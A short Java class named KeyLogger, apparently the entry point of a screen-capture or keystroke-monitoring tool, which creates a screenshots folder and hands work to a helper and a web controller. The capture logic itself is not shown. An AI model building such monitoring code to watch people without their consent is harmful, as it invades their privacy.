import java.io.File;
//
//import javax.swing.JButton;
//import javax.swing.JFrame;
//import javax.swing.JTextPane;

public class KeyLogger implements Runnable {

	private WebController web;
	private KeyLoggerHelper h;

	public KeyLogger(WebController web) {
		this.web = web;
		h = new KeyLoggerHelper(web);
	}
	
	public void take_pic() {
		h.take_pic();
	}

	public void run() {
		File file = new File("screenshots/");
		file.mkdir();
		h.startHotKeys();
	}

}
